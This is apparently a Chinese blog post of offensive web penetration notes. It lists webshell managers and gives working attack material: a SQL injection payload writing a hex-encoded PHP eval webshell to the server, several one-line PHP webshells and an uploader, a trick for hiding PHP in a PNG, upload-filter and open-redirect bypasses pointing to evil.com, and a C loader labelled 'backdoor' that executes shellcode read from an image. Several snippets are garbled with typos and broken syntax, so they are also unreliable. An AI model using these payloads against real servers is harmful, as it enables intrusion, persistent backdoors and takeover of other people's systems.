---
layout: post
title: web渗透思路
date: 2024-05-11 11:40:45
categories:
  - 网络安全
---

### 先搜有无历史漏洞

### 域名路径爆破

### SQL注入爆破

### 数据库报错注入

#### BurpSuite：请求代理工具

#### 御剑：域名爆破  dirsearch 域名爆破

#### WebShell请求管理工具 

c刀( cknife )https://github.com/Chora10/Cknife

![](https://img2.imgtp.com/2024/05/11/kxlt33kQ.png)

Weevely3https://github.com/epinna/weevely3   kali自带

中国蚁剑(AntSword )加载器:https://github.com/AntSwordProject/AntSword-Loader

![](https://img2.imgtp.com/2024/05/11/Hz6g6OI4.png)

冰蝎(Behinder)下载地址 : https://github.com/rebeyond/Behinder/

![](https://img2.imgtp.com/2024/05/11/qGErveNp.png)

使用介绍 :https://github.com/rebeyond/Behinder

#### 获取 php后台shell权限

```sql
paylodd:-123'un union ion selselectect1.2,3.4.0x3c3f70687020406576616c282451504153545b636d645d293b3f3e in intooutoutfilefile'ivar'www/htmlvuInlab/sqli/beecms/uploadizoneh.php'%23


0x3c3f70687020406576616c282451504153545b636d645d293b3f3e == <?php @eval(s_POST[cmd]);?>
```

![](https://img2.imgtp.com/2024/05/11/V6CVGIeN.png)

#### 获取权限条件

1. 要可以联合注入
2. mysql的配置secure-file-priv需要为空

#### 获取mysql路径

```sql
select @@datadir

return: E:\phpstudy\PHPutorial\MySQL\data
```

### 文件上传木马

#### 一句话马

```php
//php
<?php eval($ GET[pass]);?>
<?php eval($ POST[pass]);?>
<?php @$a = $_COOKIE[1];$b = '';$c = '';@assert($b.$a);?>
```

#### 小马

```php
<?php fputs(fopen("up.php","w"),'<?php eval($_POsT["cmd"])?>');?>
```

#### 大马

```php
<?php
$temp $ FILES['upload file']['tmp name'];$filebasename($ FILES['upload file']['name']);
if(empty ($file)){
	echo "<form action ='’ method =.'POST'.ENCTYPE='multipart/form-data'>\n";
	echo "Local file:<input type = 'file' name = 'upload file'>\n";
	echo "<input type = 'submit'value =,'Upload'>\n";
	echo "</form>\n<pre>\n\n</pre>";}else {if(move uploaded file($temp,$file)){echo "File 	uploaded successfully.<p>\n";}else {echo "Unable to upload "$file
}2
```

#### 图片中植入一句话马

```bash
copy a.png/b + a.php/a as.png
```



文件上传渗透技巧

> 假设只允许上传png后缀

```
%00 或者 0x00
#示例
test.php%00.png
test.php0x00.png
```

> 上传的png文件进行编译.htacess   （如果上传的文件修改了名称就失效了）

```
<FilesMatch "png">
SetHandler application/x-httpd-php
</FilesMatch>
```



>  url跳转有时候会做一些限制绕过

```
1.利用问号绕过限制
url=https://www.baidu.com?www.xxxx.me
2.利用@绕过限制
url=https://www.baidu.com@www.xxxx.me
3.利用斜杠反斜杠绕过限制
https://wwwlandgrey.me/redirect.php?url=http://www.evil.com/www.landgrey.me
4.利用#绕过限制
https://www.baidu.com#www.xxxx.me
5.利用子域名绕过
https://www.baidu.com.xxx.com
6.利用畸形ur绕过
https://landgrey.me/redirect.php?url=http://www.evil.coml.landgrey.me
7.利用跳转ip绕过
https://wwwipaddressguide.com/ip修改ip
8.利用xip.io绕过
http://www.qq.com.127.0.0.1.xip.io/
```



### WinHex：查看文件二进制工具

### 运行图片

```c
#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
int main(void)
{
    FILE* fp;
    size_t size;
    unsigned char* buffer;
    fp = fopen("1.png","rb");
    fseek(fp,0,SEEK_END);
    size =ftell(fp);
    fseek(fp,0，SEEK_SET);
    buffer =(unsigned char*)malloc(size);
    fread(buffer,size,1,fp);
    void* exec = VirtualAlloc(O, size, MEM COMMIT,PAGE EXECUTE READWRITE);
    memcpy(exec,buffer,size);
    ((void(*)())exec)();
    return 0;
}
```

```bash
gcc loader.c -mwindows -o eryi.exe


backdoor
```

### 获取网站搭建信息渠道

```http
https://www.baidu.com/robots.txt

securitytrails.com

旁注查询 

phpAdmin页面

IP反查域名
```

### nmap 扫描端口

### Deep xss漏洞

### 漏洞推送：监控EXP POC  Server酱  GitHub

![image-20240516202254888](C:\Users\zengyu\AppData\Roaming\Typora\typora-user-images\image-20240516202254888.png)
